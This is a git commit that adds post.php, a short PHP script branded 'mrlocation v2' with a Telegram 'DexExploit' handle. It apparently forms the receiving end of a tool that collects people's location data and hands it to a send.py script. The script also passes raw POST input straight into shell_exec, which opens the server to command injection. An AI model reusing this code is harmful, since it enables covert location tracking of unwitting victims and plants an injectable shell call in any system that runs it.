188d3a829915a1d48247e7d69c9ef91a84d042e4
xlroot <78544600+xlroot@users.noreply.github.com>
2022-06-15 04:22:46 +0430

    Create post.php

---
+++ post.php
@@ -0,0 +1,9 @@
+//code by xlroot
+//mrlocation v2
+//t.me/DexExploit
+<?php
+$json = (file_get_contents('php://input'));
+$dejson = json_decode($json, true);
+$location = $dejson['data'];
+shell_exec("python3 send.py ".$location);
+?>
